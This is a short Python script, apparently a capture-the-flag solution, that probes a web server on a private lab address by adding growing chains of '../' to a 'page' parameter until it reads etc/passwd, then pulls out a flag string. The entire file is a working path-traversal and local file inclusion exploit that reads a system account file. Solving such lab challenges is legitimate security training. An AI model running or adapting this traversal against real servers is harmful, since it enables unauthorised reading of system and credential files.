import requests

def try_directory(path: str, max: int = 20):
    for i in range(max):
        page = '/'.join(['..'] * i) + '/' + path

        response = requests.get(f'http://192.168.56.2/?page={page}')

        script = response.text.partition('\n')[0].split("'")[1::2]

        if len(script) > 0 and script[0].find("flag") != -1:
            return script[0]

def main():
    print(try_directory('etc/passwd', 10))

if __name__ == "__main__":
    main()